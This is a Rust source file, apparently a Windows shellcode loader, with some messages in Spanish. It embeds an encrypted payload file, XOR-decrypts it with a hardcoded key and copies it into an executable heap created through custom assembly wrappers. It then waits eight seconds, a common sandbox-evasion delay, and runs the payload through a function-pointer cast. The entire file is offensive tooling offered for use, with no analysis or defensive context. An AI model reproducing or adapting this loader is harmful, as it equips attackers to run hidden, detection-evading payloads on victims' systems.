use std::intrinsics::copy_nonoverlapping;
use std::mem::transmute;
use std::thread::sleep;
use std::time::Duration;
use crate::memory::{asm_heap_create, asm_heap_alloc};
use crate::utils::xor_encrypt_decrypt;
use winapi::um::errhandlingapi::GetLastError;

pub fn execute_shellcode() {
    let buffer = include_bytes!("..\\shellcode.bin");
    let size = buffer.len();
    let mut buffer_copy = buffer.to_vec();
    let key_hex = "6305ad7a22ae995dbb29fb83ec589ba7"; // Use your actual key here
    let key = hex::decode(key_hex).expect("Decoding failed");

    // Decrypt buffer
    xor_encrypt_decrypt(&key, &mut buffer_copy);

    unsafe {
        let heap = asm_heap_create(0x40000, 0, 0);
        if heap.is_null() {
            panic!("Heap creation failed with error: {}", GetLastError());
        }
        println!("Heap handle: {:?}", heap);

        let memory = asm_heap_alloc(heap, 0, size);
        if memory.is_null() {
            panic!("Heap allocation failed with error: {}", GetLastError());
        }
        println!("Memory allocated at: {:?}", memory);

        println!("Copiando buffer en el bloque de memoria reservado...");
        // Copy decrypted shellcode into allocated memory
        copy_nonoverlapping(buffer_copy.as_ptr(), memory as *mut u8, buffer_copy.len());

        // Check for errors after copying
        if GetLastError() != 0 {
            panic!("Error occurred while copying shellcode: {}", GetLastError());
        }

        println!("[+] Sleeping for 8 seconds...");
        sleep(Duration::from_secs(8));

        println!("Ejecutando shellcode en la dirección: 0x{:016X}", memory as usize);
        let shellcode: extern "C" fn() = transmute(memory);
        shellcode();
    }
}
